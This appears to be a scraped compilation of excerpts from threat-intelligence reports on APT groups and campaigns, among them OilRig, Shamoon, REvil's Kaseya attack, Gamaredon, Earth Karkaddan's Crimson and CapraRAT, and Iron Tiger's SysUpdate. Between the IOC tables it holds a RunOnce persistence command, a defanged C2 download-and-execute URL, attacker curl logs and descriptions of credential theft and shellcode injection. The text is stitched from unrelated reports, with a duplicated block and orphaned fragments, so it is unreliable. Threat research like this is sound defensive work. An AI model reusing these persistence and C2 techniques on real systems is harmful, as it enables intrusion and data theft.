"https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/ https://unit42.paloaltonetworks.com/unit42-analyzing-oilrigs-ops-tempo-testing-weaponization-delivery/ https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/ https://unit42.paloaltonetworks.com/unit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie/ https://unit42.paloaltonetworks.com/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/ https://unit42.paloaltonetworks.com/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/ https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/ https://unit42.paloaltonetworks.com/unit42-oilrig-performs-tests-twoface-webshell/ https://unit42.paloaltonetworks.com/unit42-oilrig-deploys-alma-communicator-dns-tunneling-trojan/ https://unit42.paloaltonetworks.com/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/ https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/ https://unit42.paloaltonetworks.com/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/ https://unit42.paloaltonetworks.com/unit42-oilrig-actors-provide-glimpse-development-testing-efforts/ https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/ https://attack.mitre.org/groups/G0059/ The Magic Hound campaign targeted energy, government, and technology organizations with spear-phishing emails as a delivery mechanism. These emails delivered macro-enabled Microsoft Office documents and PE files within attachments. The documents and executables attached to emails would install a variety of tools from portable PE files, .NET Framework PE files, Meterpreter, IRC bots, an open sourced Meterpreter module called Magic Unicorn, and an open sourced Python RAT called Pupy. The custom tools used in the Magic Hound campaign provided connections to other threat groups, such as the IRC Bot which was very similar to the Parastoo tool associated with the NEWSCASTER threat group."
"Also, a Magic Hound C2 server was also used as a C2 server for a tool called MPKBot that had been associated with the Rocket Kitten threat group."
https://unit42.paloaltonetworks.com/unit42-magic-hound-campaign-attacks-saudi-targets/
https://attack.mitre.org/groups/G0064/
They use spear-phishing attacks with a domain masquerading technique to make the links in their emails appear legitimate.
"A recent report uncovered this threat group’s attack infrastructure, which leveraged commercial VPN providers in addition to compromised systems to use as proxies to further mask their origins."
https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html https://blog.trendmicro.com/trendlabs-security-intelligence/more-than-a-dozen-obfuscated-apt33-botnets-used-for-extreme-narrow-targeting/
https://attack.mitre.org/groups/G0079/
The DarkHydrus threat group has targeted government entities and educational institutions with spear-phishing attacks and credential harvesting campaigns.
"DarkHydrus is a more sophisticated group when compared to others operating in the region, as their toolset and TTPs show a higher skill level."
DarkHydrus has used custom tools in addition to publicly available red-teaming tools such as Phishery.
They have also been observed using Google Drive for their C2 channel.
https://unit42.paloaltonetworks.com/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/ https://unit42.paloaltonetworks.com/unit42-darkhydrus-uses-phishery-harvest-credentials-middle-east/ https://unit42.paloaltonetworks.com/darkhydrus-delivers-new-trojan-that-can-use-google-drive-for-c2-communications/
"Since the original 2012 attack, two other instances of Shamoon have been discovered, in 2016 as well as 2018."
https://securelist.com/shamoon-the-wiper-copycats-at-work/57854/
https://unit42.paloaltonetworks.com/unit42-shamoon-2-return-disttrack-wiper/
https://unit42.paloaltonetworks.com/unit42-second-wave-shamoon-2-attacks-identified/ https://unit42.paloaltonetworks.com/unit42-shamoon-2-delivering-disttrack/ https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/ https://unit42.paloaltonetworks.com/shamoon-3-modified-open-source-wiper-contains-verse-from-the-quran/
MuddyWater is a group that emerged in 2017 and was initially thought to be part of the financially motivated criminal group commonly referred to as FIN7 due to the use of an open source tool that was used by both sets of activity.
"This group generally used spear-phishing with macro-enabled Office documents to deliver their payloads, which were either embedded directly in the macro, or hosted on a first stage C2 server."
"A significant portion of MuddyWater’s toolset consisted of open sourced red-teaming tools such as Invoke-Obfuscation, Lazagne, Mimikatz, etc. https://unit42.paloaltonetworks.com/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/ https://securelist.com/muddywater/88059/ https://www.clearskysec.com/muddywater2/ https://blog.trendmicro.com/trendlabs-security-intelligence/muddywater-resurfaces-uses-multi-stage-backdoor-powerstats-v3-and-new-post-exploitation-tools/"
"Assuming the highlighted groups are indeed Iranian in origin, their activity has been well documented and the various groups often times use very similar tactics and techniques to execute their attacks, such as the heavy use of spear-phishing and credential harvesting."
Link to IOCs on GitHub
"This post is also available in: 日本語 (Japanese) Palo Alto Networks Unit 42 threat intelligence team has just released new research that has uncovered a previously unknown second wave of Shamoon 2 attacks: Second Wave of Shamoon 2 Attacks Identified Based on our analysis, these attacks were timed to occur on November 29, 2016, twelve days after the initial Shamoon 2 attacks that we wrote about previously."
"Like the initial Shamoon 2 attacks, this second wave of Shamoon 2 attacks utilize the Disttrack wiper malware."
But this second wave of Shamoon 2 attacks show evidence of potential new tactic.
VDI solutions can provide protection against a destructive malware like Disttrack through the ability to load snapshots of wiped systems to recover from a wiper attack.
"They used access to the VSA software to deploy ransomware associated with the REvil/Sodinokibi ransomware-as-a-service group, according to reports."
The company has not released further information on the vulnerability.
Kaseya recommends that any organization using VSA shut the system down immediately.
CISA has also issued a bulletin asking organizations using the software to follow Kaseya guidance.
The full extent of the attack is currently unknown.
"If an MSP’s VSA system was compromised, that could allow an attacker to deploy malware into multiple networks managed by that MSP."
We have not been able to independently determine how these attacks were conducted.
"Multiple sources have stated that the following three files were used to install and execute the ransomware attack on Windows systems: agent.exe | d55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e mpsvc.dll | e2a24ab94f865caeacdf2c3ad015f31f23008ac6db8312c2cbfb32e4a5466ea2 mpsvc.dll | 8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd Palo Alto Networks WildFire, Threat Prevention and Cortex XDR detect and prevent REvil ransomware infections."
"As more information becomes available on the nature of this attack, we will update this brief to provide additional details. d55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e 8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd e2a24ab94f865caeacdf2c3ad015f31f23008ac6db8312c2cbfb32e4a5466ea2 Source: Incident Overview and Technical Details, Kaseya 35.226.94[.]113 161.35.239[.]148 162.253.124[.]162 POST /dl.asp curl/7.69.1 GET /done.asp curl/7.69.1 POST /cgi-bin/KUpload.dll curl/7.69.1 GET /done.asp curl/7.69.1 POST /cgi-bin/KUpload.dll curl/7.69.1 POST /userFilterTableRpt.asp curl/7.69.1 Understanding REvil: The Ransomware Gang Behind the Kaseya Attack Threat Assessment: GandCrab and REvil Ransomware 2021 Unit 42 Ransomware Threat Report Breaking Down Ransomware Attacks Ransomware’s New Trend: Exfiltration and Extortion Updated July 6, 2021, at 3:06 p.m. PT. Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"On any given day, Google's Threat Analysis Group (TAG) is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries."
"Our team of analysts and security experts is focused on identifying and stopping issues like phishing campaigns, zero-day vulnerabilities and hacking against Google, our products and our users."
"Today, we’re sharing recent findings on government-backed phishing, threats and disinformation, as well as a new bulletin to share information about actions we take against accounts that we attribute to coordinated influence campaigns."
"Last month, we sent 1,755 warnings to users whose accounts were targets of government-backed attackers."
"Generally, 2020 has been dominated by COVID-19."
"And as others have reported, we’re seeing a resurgence in COVID-related hacking and phishing attempts from numerous commercial and government-backed attackers."
"To help protect users against these kinds of tracks, our Advanced Protection Program (APP) utilizes hardware security keys and provides the strongest protections available against phishing and account hijackings."
APP was designed specifically for high-risk accounts.
"Our products are designed with robust built-in security features, like Gmail protections against phishing and Safe Browsing in Chrome, but we still dedicate significant resources to developing new tools and technology to help identify, track and stop this kind of activity."
"We will also continue to share more detailed analysis of vulnerabilities we find, phishing and malware campaigns that we see, and other interesting or noteworthy trends across this space."
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 of 2020.
"It was last updated on May 27, 2020."
We terminated 3 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We received leads from Graphika that supported us in this investigation.
"Google’s Threat Analysis Group (TAG) is a specialized team of security experts that works to identify, report, and stop government-backed phishing and hacking against Google and the people who use our products."
One notable campaign attempted to target personal accounts of U.S. government employees with phishing lures using American fast food franchises and COVID-19 messaging.
"Once people clicked on the emails, they were presented with phishing pages designed to trick them into providing their Google account credentials."
"The vast majority of these messages were sent to spam without any user ever seeing them, and we were able to preemptively block the domains using Safe Browsing."
"We’ve also seen attackers try to trick people into downloading malware by impersonating health organizations: Generally, we’re not seeing an overall rise in phishing attacks by government-backed groups; this is just a change in tactics."
"While it’s not unusual to see some fluctuations in these numbers, it could be that attackers, just like many other organizations, are experiencing productivity lags and issues due to global lockdowns and quarantine efforts."
Our teams continue to track these and stop them before they reach people—and we’ll continue to share new and interesting findings.
"From late 2019 to February of this year, researchers published several reports on Gamaredon, tracking the group’s activities."
"In March, we came across an email with a malware attachment that used the Gamaredon group’s tactics."
"A brief history of Gamaredon In 2015, researchers from LookingGlass published the first report on Gamaredon."
"The report also described Gamaredon’s political beginnings, particularly its ties to the Ukrainian revolution in 2014."
They moved on to Ukrainian government institutions after the revolution.
"In 2018, CERT-UA published an advisory against the malware Pterodo, which the group allegedly used."
"The group remained active, with several Gamaredon-related activities reported in February 2020."
"In March, they were among the threat groups that were identified taking advantage of the coronavirus pandemic to trick targets."
Opening document starts a template injection technique for loading the document template from the internet.
"The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS)."
The attacks we found all arrived through targeted emails (MITRE ATT&CK framework ID T1193).
The email that used the coronavirus-related subject came with an attached document file.
Opening this file (MITRE ATT&CK framework ID T1204) executes the template injection method (MITRE ATT&CK framework ID T1221).
Figure 2. Code for downloading the document template with the malicious macro
"As mentioned, the template contains malicious macro (MITRE ATT&CK framework ID T1064), which exports VBS (MITRE ATT&CK framework ID T1064) to execute itself."
"This particular behavior is a slight departure from previously reported attacks by Gamaredon, which did not use this technique."
Figure 5.
Registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\MediaPlayer wscript.exe //b ％USERPROFILE%\Documents\MediaPlayer\PlayList.vbs
"Connect with “hxxp:// kristom[.]hopto[.]org /{computer name}_{hexadecimal volume serious number}/help_05_03[.]php” (MITRE ATT&CK framework IDs T1043, T1071, T1082)"
"If the downloaded file size in the first step exceeds 10,485 bytes, then the file is saved as “%APPDATA%\\Microsoft\Windows\Cookies.txt” (MITRE ATT&CK framework ID T1105)"
"Use XOR for the file saved from the second step, where ASCII code converted from its own hexadecimal volume serial number is used as the key."
The decrypted result is saved as “%APPDATA%\\Microsoft\Windows\Cookies.exe” (T1001)
"If the file size of “%APPDATA%\\Microsoft\Windows\Cookies.exe” exceeds 4,485 bytes, it is executed."
"Interestingly, after decoding the VBS, we saw what appeared to be a programming mistake by the attacker."
"If, however, these lines do not pass through this IF statement, an error would occur."
Network destination for template injection: 176[.]119[.]147[.]225 Network destination for VBS: 176[.]57[.]215[.]115 These IP addresses are from Russian hosting companies.
hxxp://{FQDN}/{computer name}_{hexadecimal volume serial number}/help_{day}_{month}[.]php Conclusion Gameradon is not the first group to take advantage of the Covid-19 topic.
"Be especially wary of unsolicited emails, that come from unknown senders."
"Avoid activating macro for any attached Microsoft Office files, especially for emails that request macro activation using an image of the body of the opened file or those that don’t show anything."
"Trend Micro™ Hosted Email Securityis a no-maintenance cloud solution that delivers continuously updated protection to stop spam, malware, spear phishing, ransomware, and advanced targeted attacks before they reach the network."
"Indicators of Compromise (IoCs) DOCX file SHA256 Detection Name 0d90fe36866ee30eb5e4fd98583bc2fdb5b7da37e42692f390ac5f807a13f057 W97M_CVE20170199.ZYHC-A 036c2088cb48215f21d4f7d751d750b859d57018c04f6cadd45c0c4fee23a9f8 Trojan.W97M.CVE20170199.PG 19d03a25af5b71e859561ff8ccc0a073acb9c61b987bdb28395339f72baf46b4 Trojan.XML.PHISH.AE 62cf22f840fffd8d8781e52b492b03b4efc835571b48823b07535d52b182e861 W97M_CVE20170199.ZKHC-A 8310d39aa1cdd13ca82c769d61049310f8ddaea7cd2c3b940a8a3c248e5e7b06 Trojan.W97M.CVE20170199.PF 84e0b1d94a43c87de55c000e3acae17f4493a57badda3b27146ad8ed0f90c93e Trojan.W97M.CVE20170199.PG 85267e52016b6124e4e42f8b52e68475174c8a2bdf0bc0b501e058e2d388a819 Trojan.W97M.CVE20170199.PF b6a94f565d482906be7da4d801153eb4dab46d92f43be3e1d59ddd2c7f328109 Trojan.W97M.CVE20170199.PF cc775e3cf1a64effa55570715b73413c3ea3a6b47764a998b1272b5be059c25b Trojan.W97M.CVE20170199.PF DOT file SHA256 Detection Name TrendX 00b761bce25594da4c760574d224589daf01086c5637042982767a13a2f61bea Mal_OLEMAL-4 Downloader.VBA.TRX.XXVBAF01FF007 250b09f87fe506fbc6cedf9dbfcb594f7795ed0e02f982b5837334f09e8a184b Mal_OLEMAL-4 4b3ae36b04d6aba70089cb2099e6bc1ba16d16ea24bbf09992f23260151b9faf Mal_OLEMAL-4 946405e2f26e1cc0bd22bc7e12d403da939f02e9c4d8ddd012f049cf4bf1fda9 Mal_OLEMAL-4 9cd5fa89d579a664c28da16064057096a5703773cef0a079f228f21a4b7fd5d2 Mal_OLEMAL-4 c089ccd376c9a4d5e5bdd553181ab4821d2c26fefc299cce7a4f023a660484d5 Mal_OLEMAL-4 e888b5e657b41d45ef0b2ed939e27ff9ea3a11c46946e31372cf26d92361c012 W97M_VBSDOWNLDR.ZKHC-A f577d2b97963b717981c01b535f257e03688ff4a918aa66352aa9cd31845b67d W97M_VBSDOWNLDR.ZYHC-A SHA256 Detection Name TrendX 17161e0ab3907f637c2202a384de67fca49171c79b1b24db7c78a4680637e3d5 Trojan.X97M.CVE201711882.THCOCBO Downloader.VBA.TRX.XXVBAF01FF006 29367502e16bf1e2b788705014d0142d8bcb7fcc6a47d56fb82d7e333454e923 TrojanSpy.Win32.FAREIT.UHBAZCLIZ N/A 315e297ac510f3f2a60176f9c12fcf92681bbad758135767ba805cdea830b9ee Trojan.X97M.CVE201711882.THCOCBO Downloader.VBA.TRX.XXVBAF01FF006 3e6166a6961bc7c23d316ea9bca87d8287a4044865c3e73064054e805ef5ca1a Backdoor.Win32.REMCOS.USMANEAGFG Troj.Win32.TRX.XXPE50FFF034 3f40d4a0d0fe1eea58fa1c71308431b5c2ce6e381cacc7291e501f4eed57bfd2 Trojan.MSIL.AGENTTESLA.THCOCBO N/A ab533d6ca0c2be8860a0f7fbfc7820ffd595edc63e540ff4c5991808da6a257d Trojan.X97M.CVE201711882.THCOCBO N/A b78a3d21325d3db7470fbf1a6d254e23d349531fca4d7f458b33ca93c91e61cd Backdoor.Win32.REMCOS.USMANEAGFE Troj.Win32.TRX.XXPE50FFF034 c9c0180eba2a712f1aba1303b90cbf12c1117451ce13b68715931abc437b10cd TrojanSpy.Win32.FAREIT.UHBAZCLIZ Troj.Win32.TRX.XXPE50FFF034 C&C addresses Bambinos[.]bounceme[.]net bbtt[.]site bbtt[.]space harpa[.]site harpa[.]space harpa[.]website himym[.]site kristoffer[.]hopto[.]org kristom[.]hopto[.]org miragena[.]site miragena[.]xyz papir[.]hopto[.]org sabdja[.]3utilities[.]com sakira[.]3utilities[.]com seliconos[.]3utilities[.]com solod[.]bounceme[.]net sonik[.]hopto[.]org tele[.]3utilities[.]com violina[.]website voyager[.]myftp[.]biz voyaget[.]myftp[.]biz Mitre ATT&CK Framework Tags Malware | APT & Targeted Attacks | Research | Spam | Articles, News, Reports"
"On any given day, Google's Threat Analysis Group (TAG) is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries."
"Our team of analysts and security experts is focused on identifying and stopping issues like phishing campaigns, zero-day vulnerabilities and hacking against Google, our products and our users."
"Today, we’re sharing recent findings on government-backed phishing, threats and disinformation, as well as a new bulletin to share information about actions we take against accounts that we attribute to coordinated influence campaigns."
"Last month, we sent 1,755 warnings to users whose accounts were targets of government-backed attackers."
"Generally, 2020 has been dominated by COVID-19."
"And as others have reported, we’re seeing a resurgence in COVID-related hacking and phishing attempts from numerous commercial and government-backed attackers."
"To help protect users against these kinds of tracks, our Advanced Protection Program (APP) utilizes hardware security keys and provides the strongest protections available against phishing and account hijackings."
APP was designed specifically for high-risk accounts.
"Our products are designed with robust built-in security features, like Gmail protections against phishing and Safe Browsing in Chrome, but we still dedicate significant resources to developing new tools and technology to help identify, track and stop this kind of activity."
"We will also continue to share more detailed analysis of vulnerabilities we find, phishing and malware campaigns that we see, and other interesting or noteworthy trends across this space."
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 of 2020.
"It was last updated on May 27, 2020."
We terminated 3 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We received leads from Graphika that supported us in this investigation.
"Google’s Threat Analysis Group (TAG) is a specialized team of security experts that works to identify, report, and stop government-backed phishing and hacking against Google and the people who use our products."
One notable campaign attempted to target personal accounts of U.S. government employees with phishing lures using American fast food franchises and COVID-19 messaging.
"Once people clicked on the emails, they were presented with phishing pages designed to trick them into providing their Google account credentials."
"The vast majority of these messages were sent to spam without any user ever seeing them, and we were able to preemptively block the domains using Safe Browsing."
"We’ve also seen attackers try to trick people into downloading malware by impersonating health organizations: Generally, we’re not seeing an overall rise in phishing attacks by government-backed groups; this is just a change in tactics."
"While it’s not unusual to see some fluctuations in these numbers, it could be that attackers, just like many other organizations, are experiencing productivity lags and issues due to global lockdowns and quarantine efforts."
"Following our November update, today we’re sharing the latest insights to fight phishing, and for security teams, providing more details about our work identifying attacks against zero-day vulnerabilities."
We have a long-standing policy to send you a warning if we detect that your account is a target of government-backed phishing or malware attempts.
"In 2019, we sent almost 40,000 warnings, a nearly 25 percent drop from 2018."
We’ve detected a few emerging trends in recent months.
"Upon reviewing phishing attempts since the beginning of this year, we’ve seen a rising number of attackers, including those from Iran and North Korea, impersonating news outlets or journalists."
"For example, attackers impersonate a journalist to seed false stories with other reporters to spread disinformation."
The chart below details the Russian threat actor group SANDWORM’s targeting efforts (by sector) over the last three years.
"In 2019, one in five accounts that received a warning was targeted multiple times by attackers."
APP provides the strongest protections available against phishing and account hijacking and is specifically designed for the highest-risk accounts.
"Last year, TAG discovered that a single threat actor was capitalizing on five zero-day vulnerabilities."
"The exploits were delivered via compromised legitimate websites (e.g. watering hole attacks), links to malicious websites, and email attachments in limited spear phishing campaigns."
The majority of targets we observed were from North Korea or individuals who worked on North Korea-related issues.
The vulnerabilities underlying these exploits included: Internet Explorer - CVE-2018-8653 Internet Explorer - CVE-2019-0676 Chrome - CVE-2019-5786 Windows Kernel - CVE-2019-0808 Internet Explorer - CVE-2019-1367 Internet Explorer - CVE-2019-1429
Exploiting CVE-2019-0676 enabled attackers to reveal presence or non-presence of files on the victim’s computer; this information was later used to decide whether or not a second stage exploit should be delivered.
The attack vector for CVE-2019-1367 was rather atypical as the exploit was delivered from an Office document abusing the online video embedding feature to load an external URL conducting the exploitation.
"This APT group (also referred to as Operation C-Major, PROJECTM, Mythic Leopard, and Transparent Tribe) has been known to use social engineering and phishing lures as an entry point, after which, it deploys the Crimson RAT malware to steal information from its victims."
"In late 2021, we saw the group leverage CapraRAT, an Android RAT with clear similarities in design to the group’s favored Windows malware, Crimson RAT."
"Looking into one of Earth Karkaddan’s recent campaigns Typically, Earth Karkaddan’s arrival methods include the use of spear-phishing emails and a USB worm that would then drop and execute a remote access trojan (RAT). Figure 1. Earth Karkaddan’s attack chain"
of a fake government-related spear-phishing email
"Figure 3. An example of a coronavirus-related spear-phishing email attachment Once the victim downloads the malicious macro, it will decrypt an embedded executable dropper that is hidden inside a text box, which will then be saved to a hardcoded path prior to it executing in the machine. Figure 4. Malicious macro that decrypts an executable hidden inside a text box Figure 5. Examples of encrypted Crimson RAT executables hidden inside text boxes Once the executable file is executed, it will proceed to unzip a file named mdkhm.zip and then execute a Crimson RAT executable named dlrarhsiva.exe."
Figure 6.
The dlrarhsiva.exe Crimson RAT executable
Earth Karkaddan actors are known to use the Crimson RAT malware in its campaigns to communicate with its command-and-control (C&C) server to download other malware or exfiltrate data.
Our analysis shows that the Crimson RAT malware is compiled as a .NET binary with minimal obfuscation.
Figure 7.
"A list of minimally obfuscated commands, function names, and variables from a Crimson RAT malware sample Crimson RAT can steal credentials from browsers, collect antivirus information, capture screenshots, and list victim drives, processes, and directories."
Figure 8.
Network traffic from a Crimson RAT malware sample ObliqueRat Malware Analysis
"Aside from the Crimson RAT malware, the Earth Karkaddan APT group is also known to use the ObliqueRat malware in its campaigns."
This malware is also commonly distributed in spear-phishing campaigns using social engineering tactics to lure victims into downloading another malicious document.
Figure 9.
"Initial spear-phishing document with a link to another malicious document Once the victim clicks the link, it will download a document laced with a malicious macro."
"Upon enabling the macro, it will then download the ObliqueRat malware that is hidden inside an image file."
Figure 10.
"The downloaded ""1More-details.doc"" contains malicious macros that will download and execute the ObliqueRat malware in a victim’s machine The macros inside the file will then download a bitmap image (BMP) file where the ObliqueRAT malware is hidden, decode the downloaded BMP file, then create a persistence mechanism by creating a Startup URL which will automatically run the ObliqueRAT malware."
Figure 11.
"Malicious macro codes will download, decode, and execute the ObliqueRat malware Figure 12 shows a summary of the ObliqueRat malware’s infection chain: Figure 12."
ObliqueRat attack chain
Below is a list of backdoor commands that this particular ObliqueRAT malware variant can perform: Command (v5.2) Info 0 System information
Find certain files RHT Delete files
"Note that in this specific campaign, both the Crimson RAT malware downloader document and the ObliqueRat malware downloader share the same download domain, which is sharingmymedia[.]com."
Figure 13.
"Crimson RAT and ObliqueRat spear-phishing email attachments that feature the same download domain CapraRAT, One of Earth Karkaddan’s custom Android RAT"
"Aside from using spear-phishing emails and a USB worm as arrival vectors, Earth Karkaddan also uses Android RATs that could be deployed by means of malicious phishing links."
"This is not particularly novel for the APT group — in 2018, it used StealthAgent (detected by Trend Micro as AndroidOS_SMongo.HRX), an Android spyware that can intercept phone calls and messages, track victims’ locations, and steal photos."
"In 2020, Earth Karkaddan used an updated version of the AhMyth Android RAT to target Indian military and government personnel via a disguised porn app and a fraudulent national Covid-19 tracking app."
We observed this group using another Android RAT — TrendMicro has named this “CapraRat”— which is possibly a modified version of an open-source RAT called AndroRAT.
"While analyzing this android RAT, we saw several similar capabilities to the CrimsonRat malware that the group usually uses to infect Windows systems."
"We have been observing CapraRAT samples since 2017, and one of the first samples we analyzed (SHA-256: d9979a41027fe790399edebe5ef8765f61e1eb1a4ee1d11690b4c2a0aa38ae42, detected by Trend Micro as as AndroidOS_Androrat.HRXD)"
"revealed some interesting things in that year: they used ""com.example.appcode.appcode"" as the APK package name and used a possible public certificate “74bd7b456d9e651fc84446f65041bef1207c408d,” which possibly meant the sample was used for testing, and they just started to use it for their campaigns during that year."
"In previous years, some CrimsonRAT samples were also found to be hosted on the viral91[.]xyz domain."
"Figure 14. CrimsonRAT malware hosted in viral91[.]xyz We were also able to source a phishing document, “csd_car_price_list_2017,” that is related to this domain and has been seen in the wild in 2017."
Access the unique identification number Access location information
"Once the Android RAT is executed, it will attempt to establish a connection to its C&C server, 209[.]127[.]19[.]241[:]10284."
"We have observed that the Remote Desktop Protocol (RDP) certificate associated in this deployment, “WIN-P9NRMH5G6M8,” is a common string found in previously identified Earth Karkaddan C&C servers."
Figure 15. Decompiled code from CapraRAT connecting to its C&C server Figure 16. CapraRAT config showing its C&C server and port information Figure 17.
Backdoor commands found in CapraRAT This APK file also has the ability to drop mp4 or APK files from asset directory.
Figure 18. CapraRAT APK file drops an mp4 file The RAT also has a persistence mechanism that always keeps the app active.
"It checks whether the service is still running every minute, and if it is not, the service will be launched again."
Figure 19.
CapraRAT’s persistence mechanism Reducing risks:
Be wary of the scope of app permissions
It also protects organizations from email-based threats.
Indicators of Compromise
"Update as of April 27, 2021, 7 A.M. E.T.:"
This blog details how Iron Tiger threat actors have updated their toolkit with an updated SysUpdate malware variant that now uses five files in its infection routine instead of the usual three.
A Look at the Iron Tiger Threat Group
"In 2020 and 2021, Talent-Jump found new samples for malware families that are attributed to the Iron Tiger threat actor, which is also referred to as LuckyMouse, EmissaryPanda, and APT27."
"While investigating Operation DRBControl in 2019, we found several connections to multiple threat actors: Iron Tiger, which uses the HyperBro trojan and some infrastructure links Winnti, which uses the same infrastructure and code-sharing links detailed in our paper Bronze President, a threat actor that targets non-governmental organizations (NGOs)."
"However, after the publication of our report, we learned that the Type 2 malware family described in our report was the same as the “RCSession” malware family that Dell Secureworks described in a blog that they published in December 2019."
"After finding multiple tools belonging to the Iron Tiger threat actor (which we now track as Earth Smilodon), it is likely that the new malware families that we found during the Operation DRBControl investigation came from the same threat actor."
New Version of SysUpdate Malware Figure 1.
"The old and new SysUpdate infection chains In December 2020, we found a sample that we identified as one belonging to the SysUpdate malware family, also named Soldier, FOCUSFJORD, and HyperSSL."
SysUpdate was first described by the NCC Group in 2018.
"An additional executable that serves as a launcher is loaded in memory, which then loads the final SysUpdate payload."
"Based on our investigation, instead of the usual three files, the threat actor used five: dlpumgr32.exe, a legitimate signed file that belongs to the DESlock+ product DLPPREM32.DLL, a malicious DLL sideloaded by dlpumgr32.exe that loads and decodes DLPPREM32.bin DLPPREM32.bin, a shellcode that decompresses and loads a launcher in memory data.res, an encrypted file decoded by the launcher and contains two SysUpdate versions: one for a 32-bit architecture and another for a 64-bit architecture config.res, an encrypted file decoded by the launcher and contains the SysUpdate configuration, such as the command-and-control (C&C) address"
"In detail, this process involves multiple steps."
4 Directory to copy all files %PROGRAMDATA%\Test\ 8 Name of the legitimate executable dlpumgr32.exe 12 Name of the sideloaded DLL DLPPREM32.DLL
16 Name of the shellcode DLPPREM32.bin 20 Name of the encrypted payload data.res 24 MD5 of the encrypted payload e43e40416520dab5b4c44ac8af907078 28 Name of the encrypted configuration config.res 32 Name of the registry key value servTest 36 Name of the service DisplayName Servdisplay Table 1.
The launcher’s behavior changes depending on the number of arguments passed to the executable.
Windows Management Instrumentation (WMI) will be used to run dlpumgr32.exe with arguments “-up -run -x” and it will exit the current process.
One argument.
Three arguments.
"It encodes it using another key and writes it to the registry key “Software\Classes\scConfig” (HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER hive, depending on the privileges of the process)."
"After decrypting the configuration, the config.res file is deleted."
The launcher decrypts the data.res file with a different hardcoded DES key.
The result is a file with the following structure: Size of the 32-bit shellcode 32-bit shellcode Size of the 64-bit shellcode 64-bit shellcode Table 2.
"Structure of decrypted data.res file Lastly, the launcher starts a suspended process with the command line “C:\Windows\system32\svchost.exe -k LocalServices,”and injects the appropriate shellcode into it (either 32- or 64-bit)."
The following diagram summarizes the launch procedure: Figure 2.
Analysis of the Payload
The features of the updated SysUpdate payload look similar to its previous versions.
"Others have been in existence for many years, such as TPacket, SCM Client, SystemInfo, CMD5, CIOStream, and CInfo."
Some of the classes’ names
It should be noted that we also found recent samples of the SysUpdate backdoor that do not implement these “new” classes.
"On two occasions (in March and October 2020), we found a kernel rootkit that had been deployed."
"After analysis, it appears that this rootkit’s behavior is very similar to that of the NDISProxy driver and remote access trojan (RAT)."
The rootkit has multiple stages before getting to the actual payload:
"This is done in conjunction with the Process Monitor driver (procxp152.sys), both of which are dropped upon loading the rootkit, even if they are not originally installed in the machine."
"Injects final payload into ""lsass.exe"" Stage 3 - Final Payload Installs itself as a Windows service"
Each backdoor has a different token that is encrypted in the registry.
"In the version that we’ve analyzed, the installer writes the token in the registry key."
"Pandora backdoor samples with different tokens Based on our analysis, the Pandora backdoor contains more public code repositories compared with previous versions."
"Feature Name Repository Driver memory injection Blackbone https://github.com/DarthTon/Blackbone NDIS network filtering driver WFP Sample ""WDK\Windows Filtering Platform Stream Edit Sample/C++/sys/stream_callout.c”"
Parse HTTP packets HTTP Parser https://github.com/nodejs/http-parser
https://github.com/hfiref0x/Stryker
Encrypted Communication D3DES https://gitlab.gnome.org/GNOME/gtk-vnc/-/blob/v0.1.0/src/d3des.c Compression QuickLZ https://github.com/robottwo/quicklz Table 4.
Pandora’s public code repositories Rootkits From a Public Repository
Hidden.sys - https://github.com/JKornev/hidden/tree/master/
The certificate has been valid since February 2020.
Hidden Registry/Folder/File Type Value REG HKLM\SYSTEM\CurrentControlSet\services\HiddenService REG HKLM\SYSTEM\CurrentControlSet\services\servTest REG HKLM\SYSTEM\CurrentControlSet\services\TrkWkss Folder C:\programdata\vlc File C:\programdata\vlc\vlc.exe Folder C:\programdata\test File C:\programdata\test\dlpumgr32.exe File C:\windows\system32\drivers\Hidden.sys File C:\windows\system32\HiddenService.exe Table 5.
The references to “Hidden” are related to the rootkit itself.
The “dlpumgr32.exe” and “servTest” lines are related to the new version of SysUpdate which we described earlier.
We do not know which malware variant is being sideloaded by vlc.exe.
It is probably installed as a service named “TrkWkss.”
This confirms that this threat actor is abusing this legitimate program to sideload its backdoors.
HyperBro Malware Family
The Iron Tiger APT group has used the HyperBro malware family since at least 2017.
"It is the evolved version of HttpBrowser, which the group has been using since at least 2015."
"All the requests were sent to the C&C server on port 443, with “/ajax” as the uniform resource identifier (URI)."
"While investigating Operation DRBControl, we found an updated version of this malware family that implements some new classes."
We provided a detailed analysis of this new HyperBro version in our research.
"However, we continue seeing samples that feature the “older” behaviors, which suggests that different groups — or possibly subgroups of Iron Tiger — are using this malware family."
FRP Tool
"We found the FRP tool being used on a Linux host, which is similar to Avast’s findings in a report that they published on the Iron Tiger threat actor."
"The FRP tool that we analyzed was a modified version, which was possibly copied off of Github."
